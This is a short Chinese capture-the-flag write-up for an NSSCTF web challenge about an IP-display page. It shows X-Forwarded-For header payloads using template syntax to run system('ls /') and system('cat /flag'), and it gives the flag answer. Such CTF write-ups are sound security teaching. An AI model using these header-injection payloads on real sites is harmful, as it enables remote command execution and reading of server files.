---
title: "看看ip"
published: 2025-09-07
category: CTF
---

![](https://pic.npiter.de/file/1757210100958_0.png)

打开网站发现,点击`Reveal My IP`可以显示自己的当前ip，打开bp进行抓包这个过程

发现只是调用了一个ip查询的api，返回结果而已

因为是看看ip加fetch联想道[xff](https://so.csdn.net/so/search?q=xff&spm=1001.2101.3001.7020)头伪造命令执行，构造

```
X-Forwarded-For:{{system('ls /')}}
```

![](https://pic.npiter.de/file/1757210096373_3.png)
发现网页返回

![](https://pic.npiter.de/file/1757210098867_1.png)

发现有flag字样，于是直接构造

```
X-Forwarded-For:{{system('cat /flag')}}
```

得到返回

![](https://pic.npiter.de/file/1757210099224_2.png)

FLAG:

 	- **NSSCTF{220b62a8-5e58-4498-ba00-218dd328b303}**
